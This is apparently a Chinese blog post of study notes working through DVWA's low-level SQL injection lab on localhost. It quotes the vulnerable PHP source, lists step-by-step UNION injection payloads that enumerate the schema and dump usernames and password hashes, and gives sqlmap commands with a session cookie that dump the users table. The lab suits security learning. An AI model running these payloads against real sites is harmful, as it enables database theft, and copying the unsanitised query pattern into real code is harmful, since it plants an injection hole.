---
title: "dvwa-sql-显注-low"
date: 2020-04-15 17:38:31
categories: secure
tags: 
- secure
- sql
- ctf
---

# dvwa-sql-显注-low

> 就拿dvwa学习一下sql的手工注入,以及sqlmap的使用
>
> 做些笔记

## tip

1. concat_ws(1,2,3): 使用1作为连接符,连接2和3

   方便从一个显示位,显示多种内容

2. char(32,58,32): char将其中的ascii值转成字符

   这里是空格冒号空格

   作为concat_ws使用,比较美观

## low

源码

```php
<?php
if( isset( $_REQUEST[ 'Submit' ] ) ) {
    // Get input
    $id = $_REQUEST[ 'id' ];

    // Check database
    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );

    // Get results
    while( $row = mysqli_fetch_assoc( $result ) ) {
        // Get values
        $first = $row["first_name"];
        $last  = $row["last_name"];

        // Feedback for end user
        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
    }

    mysqli_close($GLOBALS["___mysqli_ston"]);
}
?>
```



### 手工注入

1. 输入`'`,发现有报错,说明很可能有sql注入

2. `1' order by 2#`猜解列数

   order by后面加数字时,表示按第几列进行排序

   如果没有那列的话,就会报错

   该步的目的,是为了使用union select

   因为union select 要求两者的列数相同,才能进行查询

   ![Snipaste_2020-04-15_10-48-47](Snipaste_2020-04-15_10-48-47.png)

   ![Snipaste_2020-04-15_10-48-55](Snipaste_2020-04-15_10-48-55.png)

3. `1' union select 1,2#`爆显示位

   从输入中,可以发现,两个都能显示出来

   也就是说,每次可以查询两个地方

   ![Snipaste_2020-04-15_10-51-10](Snipaste_2020-04-15_10-51-10.png)

4. `1' union select version(),database()#`

   查询一下sql版本和当前数据库名称

   sql版本很重要,因为版本>(多少我忘了><)时,会有一个`information_schema`数据库,里面有好多好多好东西

   ![Snipaste_2020-04-15_10-47-58](Snipaste_2020-04-15_10-47-58.png)

   `1' union select null,concat_ws(char(32,58,32),user(),database(),version())#`

   另一种方法,会在第二个显示位一起爆出用户、数据库及其版本信息

   ![Snipaste_2020-04-15_16-23-32](Snipaste_2020-04-15_16-23-32.png)

5. `1' union select null,group_concat(table_name) from information_schema.tables where table_schema='dvwa' #`

   版本比较大,所以有`information_schema`;得知数据库名后,就可以查表了

   ![Snipaste_2020-04-15_16-27-26](Snipaste_2020-04-15_16-27-26.png)

   可以看出dvwa中有两个表`guestbook`and`users`

   明显users重要点,所以下一步查users的列

6. `1' union select null,group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users' #`

   ![Snipaste_2020-04-15_16-38-54](Snipaste_2020-04-15_16-38-54.png)

   其中`user`和`password`看起来比较重要

7. `1' union select null, group_concat(concat_ws(char(32,58,32),user,password)) from users #`

   ![Snipaste_2020-04-15_16-43-02](Snipaste_2020-04-15_16-43-02.png)

8. 如果不想显示在一条上,而是分开查询的话,把group_concat删了就行

   - 查表

     `1' union select null,table_name from information_schema.tables where table_schema='dvwa' #`

     ![Snipaste_2020-04-15_16-46-11](Snipaste_2020-04-15_16-46-11.png)

   - 查列

     `1' union select null,column_name from information_schema.columns where table_schema='dvwa' and table_name='users' #`

     ![Snipaste_2020-04-15_16-46-27](Snipaste_2020-04-15_16-46-27.png)

   - 查内容

     `1' union select null, concat_ws(char(32,58,32),user,password) from users #`

     ![Snipaste_2020-04-15_16-46-37](Snipaste_2020-04-15_16-46-37.png)



### sqlmap

1. 准备好网址

   在id中输入1,是的url中包含参数名称

   ```
   http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&Submit=Submit#
   ```

2. 准备好cookie

   ```
   security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1
   ```

3. 打开sqlmap,输入

   ```
   python sqlmap.py -u "http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1" --batch
   ```

   康康有没有sql注入

   - -u参数指定目标URL
   - --batch参数采用默认选项,不进行询问
   - --cookie参数指定cookie

   可以看到是存在注入的

   ![Snipaste_2020-04-15_17-13-57](Snipaste_2020-04-15_17-13-57.png)

4. 查看所有的数据库

   ```
   python sqlmap.py -u "http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1" --batch --dbs
   ```

   - --dbs所有数据库

   ![Snipaste_2020-04-15_17-15-16](Snipaste_2020-04-15_17-15-16.png)

5. 所以我们要用的应该是dvwa那个库,然后康康里面有什么表

   ```
   python sqlmap.py -u "http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1" --batch -D dvwa --tables
   ```

   - -D参数指定为dvwa数据库
   - --tables参数查看所有的表

   ![image-20200415171817802](image-20200415171817802.png)

6. 查看users表中的列

   ```
   python sqlmap.py -u "http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1" --batch -D dvwa -T users --columns
   ```

   - -T参数指定表为users
   - --columns查看该表的所有列

   ![image-20200415172014493](image-20200415172014493.png)

7. 最后看看整个表中都有什么

   ```
   python sqlmap.py -u "http://localhost/DVWA-master/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie="security=low; PHPSESSID=9v0e6li5s4iok70h3fi7al0gv1" --batch -D dvwa -T users --dump
   ```

   - --dump参数将所有列的信息都列出来

   ![image-20200415172329770](image-20200415172329770.png)



